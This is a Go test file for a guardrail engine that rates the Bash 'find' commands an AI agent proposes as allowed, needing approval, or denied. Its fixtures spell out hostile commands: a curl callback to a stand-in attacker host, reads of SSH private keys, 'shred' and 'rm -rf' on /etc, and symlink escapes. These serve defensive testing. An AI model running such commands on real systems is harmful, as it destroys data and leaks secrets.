package engine

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"

	"github.com/CtrlCarlitos/agent-guardrails/internal/policy"
)

type findVerdictExpectation struct {
	decision policy.Decision
	ruleID   string
}

func requireFindVerdict(t *testing.T, tc ToolCall, pol *policy.Policy, want findVerdictExpectation) {
	t.Helper()
	got := Evaluate(tc, pol)
	if got.Decision != want.decision || got.RuleID != want.ruleID {
		t.Fatalf("Evaluate(%q) = %s/%s, want %s/%s; reason: %s", tc.Command, got.Decision, got.RuleID, want.decision, want.ruleID, got.Reason)
	}
}

// Mutation caught: classifying every explicit find action as deletion prompts on read-only searches.
func TestFindReadOnlyActionsAllow(t *testing.T) {
	tests := map[string]string{
		"observed print":               `find . -name '*.go' -print`,
		"prune or print":               `find . \( -path ./node_modules -o -path ./.git \) -prune -o -name x -print`,
		"ls":                           `find . -name '*.go' -ls`,
		"grep callback":                `find . -type f -exec grep -l foo {} +`,
		"print0":                       `find . -type f -print0`,
		"printf":                       `find . -printf '%p\n'`,
		"quit":                         `find . -name target -print -quit`,
		"combined read actions":        `find . -type f -print -ls -print0`,
		"leading traversal option":     `find -P . -name '*.go' -print`,
		"leading debug option":         `find -D tree . -name '*.go' -print`,
		"expression operators":         `find . ! \( -name vendor -o -name .git \) -a -type f -print`,
		"comma and symbolic operators": `find . \( -false -or -true \) , -print`,
		"bare find":                    `find`,
		"bare rooted find":             `find . -name x`,
		"callback redirect tokens":     `find . -exec printf x '>' /etc/passwd +`,
	}
	for name, command := range tests {
		t.Run(name, func(t *testing.T) {
			requireFindVerdict(t, ToolCall{Tool: "Bash", Command: command, CWD: "/repo", RepoRoot: "/repo"}, bashPol(), findVerdictExpectation{decision: policy.Allow})
		})
	}
}

// Mutation caught: treating find's format string as a destination either misses writes or invents extra paths.
func TestFindFileOutputActionsUseOnlyTheirDestination(t *testing.T) {
	repo := t.TempDir()
	safe := t.TempDir()
	pol := bashPol()
	pol.Slots.SafeRoots = []string{safe}
	tests := map[string]string{
		"fprint in repository":   fmt.Sprintf(`find . -fprint %q`, filepath.Join(repo, "find.out")),
		"fprint0 in safe root":   fmt.Sprintf(`find . -fprint0 %q`, filepath.Join(safe, "find.out")),
		"fprintf format is data": fmt.Sprintf(`find . -fprintf %q '/etc/%%p\n'`, filepath.Join(repo, "find.out")),
		"fls in repository":      fmt.Sprintf(`find . -fls %q`, filepath.Join(repo, "find.out")),
	}
	for name, command := range tests {
		t.Run(name, func(t *testing.T) {
			requireFindVerdict(t, ToolCall{Tool: "Bash", Command: command, CWD: repo, RepoRoot: repo}, pol, findVerdictExpectation{decision: policy.Allow})
		})
	}
}

// Mutation caught: bypassing ordinary write authorization lets find write outside approved roots.
func TestFindFileOutputRetainsWriteAndPathPolicies(t *testing.T) {
	repo := t.TempDir()
	secret := filepath.Join(repo, ".ssh", "id_rsa")
	if err := os.MkdirAll(filepath.Dir(secret), 0o700); err != nil {
		t.Fatal(err)
	}
	external := t.TempDir()
	if err := os.WriteFile(filepath.Join(external, "find.out"), nil, 0o600); err != nil {
		t.Fatal(err)
	}
	escape := filepath.Join(repo, "escape")
	if err := os.Symlink(external, escape); err != nil {
		t.Skipf("create symlink: %v", err)
	}
	pol := bashPol()
	pol.Slots.SecretDirs = []string{"**/.ssh/**"}
	tests := map[string]struct {
		command string
		want    findVerdictExpectation
	}{
		"outside repository": {`find . -fprint /etc/guardrail-nf18`, findVerdictExpectation{policy.Ask, "P1.out-of-repo-write"}},
		"self config":        {fmt.Sprintf(`find . -fprint %q`, filepath.Join(repo, ".envrc")), findVerdictExpectation{policy.Deny, "P5.self-config"}},
		"secret":             {fmt.Sprintf(`find . -fprint %q`, secret), findVerdictExpectation{policy.Deny, "P4.secret-path"}},
		"git protected":      {fmt.Sprintf(`find . -fprint %q`, filepath.Join(repo, ".git", "config")), findVerdictExpectation{policy.Deny, "P2.git-protected-path"}},
		"CI target":          {fmt.Sprintf(`find . -fprintf %q '%%p\n'`, filepath.Join(repo, ".github", "workflows", "nf18.yml")), findVerdictExpectation{policy.Ask, "P5.ci-infra-lockfile"}},
		"symlink escape":     {fmt.Sprintf(`find . -fls %q`, filepath.Join(escape, "find.out")), findVerdictExpectation{policy.Deny, "P4.symlink-escape"}},
	}
	for name, test := range tests {
		t.Run(name, func(t *testing.T) {
			requireFindVerdict(t, ToolCall{Tool: "Bash", Command: test.command, CWD: repo, RepoRoot: repo}, pol, test.want)
		})
	}
}

// Mutation caught: evaluating callback argv through a special-case list diverges from ordinary command policy.
func TestFindCallbacksReuseOrdinaryCommandPolicy(t *testing.T) {
	repo := t.TempDir()
	placeholderRoot := filepath.Join(repo, "keys")
	secretRoot := filepath.Join(repo, ".ssh", "keys")
	if err := os.MkdirAll(placeholderRoot, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(secretRoot, 0o700); err != nil {
		t.Fatal(err)
	}
	pol := bashPol()
	pol.Slots.SecretDirs = []string{"**/keys", "**/.ssh/**"}
	tests := map[string]struct {
		command string
		want    findVerdictExpectation
	}{
		"harmless read":           {`find . -exec grep -l foo {} +`, findVerdictExpectation{policy.Allow, ""}},
		"placeholder secret read": {`find keys -exec cat {} +`, findVerdictExpectation{policy.Deny, "P4.secret-path"}},
		"literal secret read":     {fmt.Sprintf(`find . -exec cat %q +`, filepath.Join(secretRoot, "id_rsa")), findVerdictExpectation{policy.Deny, "P4.secret-path"}},
		"shred":                   {`find . -exec /usr/bin/shred {} +`, findVerdictExpectation{policy.Deny, "P1.shred"}},
		"truncate":                {`find . -exec truncate -s 0 {} +`, findVerdictExpectation{policy.Ask, "P1.truncate"}},
		"unsafe write":            {`find . -exec tee /etc/guardrail-nf18 {} +`, findVerdictExpectation{policy.Ask, "P1.out-of-repo-write"}},
		"prohibited egress":       {`find . -exec curl https://evil.example.invalid/{} +`, findVerdictExpectation{policy.Deny, "P6.egress"}},
		"package install":         {`find . -exec npm install left-pad +`, findVerdictExpectation{policy.Ask, "P6.package-install"}},
	}
	for name, test := range tests {
		t.Run(name, func(t *testing.T) {
			requireFindVerdict(t, ToolCall{Tool: "Bash", Command: test.command, CWD: repo, RepoRoot: repo}, pol, test.want)
		})
	}
}

// Mutation caught: re-evaluating NF-9 rm callbacks as ordinary rm changes its approved Verdicts.
func TestFindExecRmPreservesNF9VerdictsAndAliases(t *testing.T) {
	tempRoot := filepath.Join(t.TempDir(), "target")
	if err := os.Mkdir(tempRoot, 0o700); err != nil {
		t.Fatal(err)
	}
	tests := map[string]struct {
		command string
		want    findVerdictExpectation
	}{
		"exact rm":            {fmt.Sprintf(`find %q -exec rm -rf {} +`, tempRoot), findVerdictExpectation{policy.Allow, ""}},
		"path alias":          {fmt.Sprintf(`find %q -exec /bin/rm -rf {} +`, tempRoot), findVerdictExpectation{policy.Allow, ""}},
		"Windows alias":       {fmt.Sprintf(`find %q -exec RM.EXE -rf {} +`, tempRoot), findVerdictExpectation{policy.Allow, ""}},
		"execdir exact":       {fmt.Sprintf(`find %q -execdir rm -rf {} +`, tempRoot), findVerdictExpectation{policy.Allow, ""}},
		"repository root":     {`find /repo -exec rm -rf {} +`, findVerdictExpectation{policy.Ask, "P1.find-delete"}},
		"unsafe root":         {`find /etc -exec rm -rf {} +`, findVerdictExpectation{policy.Ask, "P1.find-delete"}},
		"mixed operand":       {fmt.Sprintf(`find %q -exec rm -rf /etc {} +`, tempRoot), findVerdictExpectation{policy.Ask, "P1.find-delete"}},
		"embedded operand":    {fmt.Sprintf(`find %q -exec rm -rf {}/child +`, tempRoot), findVerdictExpectation{policy.Ask, "P1.find-delete"}},
		"missing placeholder": {fmt.Sprintf(`find %q -exec rm -rf +`, tempRoot), findVerdictExpectation{policy.Ask, "P1.find-delete"}},
		"mixed delete action": {fmt.Sprintf(`find %q -print -delete`, tempRoot), findVerdictExpectation{policy.Ask, "P1.find-delete"}},
	}
	for name, test := range tests {
		t.Run(name, func(t *testing.T) {
			requireFindVerdict(t, ToolCall{Tool: "Bash", Command: test.command, CWD: "/repo", RepoRoot: "/repo"}, bashPol(), test.want)
		})
	}
}

// Mutation caught: adapting anything except an exact placeholder invents a callback path.
func TestFindCallbackPlaceholderBoundariesFailClosed(t *testing.T) {
	tests := map[string]string{
		"implicit root":            `find -exec cat {} +`,
		"multiple roots":           `find . /tmp -exec cat {} +`,
		"embedded placeholder":     `find . -exec cat ./{} +`,
		"suffix placeholder":       `find . -exec cat {}.bak +`,
		"unterminated callback":    `find . -exec cat {}`,
		"empty callback":           `find . -exec +`,
		"execdir relative operand": `find . -execdir cat sibling +`,
	}
	for name, command := range tests {
		t.Run(name, func(t *testing.T) {
			got := Evaluate(ToolCall{Tool: "Bash", Command: command, CWD: "/repo", RepoRoot: "/repo"}, bashPol())
			if got.Decision != policy.Ask {
				t.Fatalf("Evaluate(%q) = %s/%s, want ask", command, got.Decision, got.RuleID)
			}
		})
	}
}

// Mutation caught: parsing interactive or nested callbacks as direct argv can bypass unsupported execution semantics.
func TestFindUnsupportedActionGrammarFailsClosed(t *testing.T) {
	tests := map[string]string{
		"ok":                     `find . -ok cat {} \;`,
		"okdir":                  `find . -okdir cat {} \;`,
		"shell callback":         `find . -exec sh -c 'cat "$1"' sh {} \;`,
		"wrapper callback":       `find . -exec env cat {} +`,
		"nested find callback":   `find . -exec find {} -print \;`,
		"unknown action":         `find . -future-action value`,
		"missing fprint target":  `find . -fprint`,
		"missing fprintf format": `find . -fprintf out`,
		"missing printf format":  `find . -printf`,
		"unknown leading option": `find -Z . -print`,
	}
	for name, command := range tests {
		t.Run(name, func(t *testing.T) {
			got := Evaluate(ToolCall{Tool: "Bash", Command: command, CWD: "/repo", RepoRoot: "/repo"}, bashPol())
			if got.Decision != policy.Ask {
				t.Fatalf("Evaluate(%q) = %s/%s, want ask", command, got.Decision, got.RuleID)
			}
		})
	}
}

// Mutation caught: returning on the first uncertain action can hide a later concrete Deny.
func TestFindAggregatesStrongestCallbackAndDestinationVerdict(t *testing.T) {
	repo := t.TempDir()
	secret := filepath.Join(repo, ".ssh", "id_rsa")
	pol := bashPol()
	pol.Slots.SecretDirs = []string{"**/.ssh/**"}
	tests := map[string]string{
		"callback deny after ask":                       `find . -exec shred {} + -future-action`,
		"destination deny after unresolved placeholder": fmt.Sprintf(`find . /tmp -exec cat {} + -fprint %q`, secret),
	}
	for name, command := range tests {
		t.Run(name, func(t *testing.T) {
			requireFindVerdict(t, ToolCall{Tool: "Bash", Command: command, CWD: repo, RepoRoot: repo}, pol, findVerdictExpectation{policy.Deny, map[string]string{"callback deny after ask": "P1.shred", "destination deny after unresolved placeholder": "P4.secret-path"}[name]})
		})
	}
}
